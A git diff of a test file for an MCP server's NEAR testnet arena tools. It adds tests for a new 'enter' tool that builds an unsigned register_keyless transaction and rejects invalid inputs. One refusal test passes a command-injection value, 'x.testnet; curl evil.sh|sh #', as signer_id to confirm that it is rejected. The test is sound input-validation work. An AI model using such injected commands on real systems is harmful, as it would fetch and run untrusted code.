@@ -1,7 +1,9 @@
 // The MCP server end to end through mcp-handler, as an MCP client sees it over HTTP: tools/list, and tools/call
 // inject on a deploy-17 duel (an unsigned inject_chaos at the current chaos_fee), on a closed duel, with a headline the
-// contract would refuse, and on deploy 16.1. The reader is a fixture: no RPC, no solver, no key.
+// contract would refuse, and on deploy 16.1; enter (an unsigned register_keyless) and its refusals. The reader is a
+// fixture: no RPC, no solver, no key.
 import { expect, test } from "bun:test";
+import { readFileSync } from "node:fs";
 import { createMcpHandler } from "mcp-handler";
 import { type Duel, type Reader, register } from "../api/mcp/tools";
 import type { Chaos } from "../lib/abi/arena";
@@ -10,6 +12,9 @@ const NS = (ms: number) => String(BigInt(ms) * 1_000_000n);
 const PK_A = "q83vEjRWeJCrze8SNFZ4kKvN7xI0VniQq83vEjRWeJA=";
 const PK_B = "ZmVkY2JhOTg3NjU0MzIxMGZlZGNiYTk4NzY1NDMyMTA=";
 const CONTRACT = "arena.nearbuddy-solver.testnet";
+const KEYLESS = "v2.nb-keyless-arena-1111.testnet";
+const PINNED = [{ model_id: "deepseek-ai/DeepSeek-V4.1-Flash-1017", signer: PK_A }];
+let keylessContract: string | null = KEYLESS;
 const TERMS = {
   base: "100000000000000000000000",
   cap: "1000000000000000000000000",
@@ -52,6 +57,7 @@ const reader = (config: typeof v17 | typeof v16): Reader => ({
     return "156250000000000000000000"; // chaos_fee now: one more paid attack landed since the cache
   },
   fetcher: (async () => Response.json({ payload_hash: "solver-hash" })) as unknown as typeof fetch,
+  keyless: async () => ({ contract: keylessContract, models: keylessContract ? PINNED : [] }),
 });
 
 /** One JSON-RPC request to a fresh stateless server, the way a Streamable HTTP client posts it. */
@@ -76,10 +82,11 @@ const call = async (config: typeof v17 | typeof v16, args: Record<string, unknow
   return r.result as { isError?: boolean; content: { text: string }[]; structuredContent?: Record<string, unknown> };
 };
 
-test("tools/list: arena, duel, agent, inject, claim, verify", async () => {
+test("tools/list: arena, duel, agent, inject, claim, enter, verify", async () => {
   const r = await rpc(v17, "tools/list", {});
   const tools = (r.result?.tools ?? []) as { name: string; inputSchema: { required?: string[] } }[];
-  expect(tools.map((t) => t.name).sort()).toEqual(["agent", "arena", "claim", "duel", "inject", "verify"]);
+  expect(tools.map((t) => t.name).sort()).toEqual(["agent", "arena", "claim", "duel", "enter", "inject", "verify"]);
+  expect(tools.find((t) => t.name === "enter")?.inputSchema.required?.sort()).toEqual(["model_id", "strategy"]);
   expect(tools.find((t) => t.name === "inject")?.inputSchema.required?.sort()).toEqual([
     "duel_id",
     "headline",
@@ -172,4 +179,60 @@ test("inject on deploy 16.1: the solver's hash, min_chaos_deposit, and the kind 
     gas: "60000000000000",
     deposit: "100000000000000000000000",
   });
+});
+
+const enter = async (args: Record<string, unknown>) => {
+  const r = await rpc(v17, "tools/call", { name: "enter", arguments: args });
+  return r.result as { isError?: boolean; content: { text: string }[]; structuredContent?: Record<string, unknown> };
+};
+const V = JSON.parse(readFileSync(`${import.meta.dir}/../../../fixtures/keyless-vectors.json`, "utf8"));
+
+test("enter: the unsigned register_keyless on the keyless arena, deposit = the bond", async () => {
+  const r = await enter({
+    model_id: PINNED[0]?.model_id,
+    strategy: "Fade the move.",
+    bond_near: "0.25",
+    signer_id: "bob.testnet",
+  });
+  expect(r.isError).toBeFalsy();
+  const s = r.structuredContent as {
+    contract: string;
+    deposit_near: string;
+    near_cli: string;
+    transaction: { signerId: string; receiverId: string; actions: { params: unknown }[] };
+  };
+  expect(s.contract).toBe(KEYLESS);
+  expect(s.deposit_near).toBe("0.250");
+  expect(s.transaction.signerId).toBe("bob.testnet");
+  expect(s.transaction.receiverId).toBe(KEYLESS);
+  expect(s.transaction.actions[0]?.params).toEqual({
+    methodName: "register_keyless",
+    args: { model_id: "deepseek-ai/DeepSeek-V4.1-Flash-1017", strategy: "Fade the move.", template_version: 1 },
+    gas: "30000000000000",
+    deposit: "250000000000000000000000",
+  });
+  expect(s.near_cli).toContain(`'${KEYLESS}' 'register_keyless'`);
+});
+
+test("enter refuses what the contract would: every strategy reject vector, an unpinned model, a tiny bond, no arena", async () => {
+  const base = { model_id: PINNED[0]?.model_id, strategy: "ok" };
+  const strategies = V.reject.filter((r: { patch: object }) => "strategy" in r.patch);
+  expect(strategies.length).toBeGreaterThanOrEqual(6);
+  for (const v of strategies)
+    expect((await enter({ ...base, strategy: v.patch.strategy })).content[0]?.text, v.name).toBe(
+      `the contract would refuse this: ${v.error}`,
+    );
+  expect((await enter({ ...base, model_id: "openai/gpt-oss-120b" })).content[0]?.text).toBe(
+    `model_id must be a model pinned on ${KEYLESS}: deepseek-ai/DeepSeek-V4.1-Flash-1017`,
+  );
+  expect((await enter({ ...base, bond_near: "0.01" })).content[0]?.text).toBe(
+    "the contract would refuse this: bond: at least 0.02 NEAR",
+  );
+  expect((await enter({ ...base, signer_id: "x.testnet; curl evil.sh|sh #" })).isError).toBe(true);
+  keylessContract = null;
+  try {
+    expect((await enter(base)).content[0]?.text).toBe("no keyless arena on testnet yet");
+  } finally {
+    keylessContract = KEYLESS;
+  }
 });
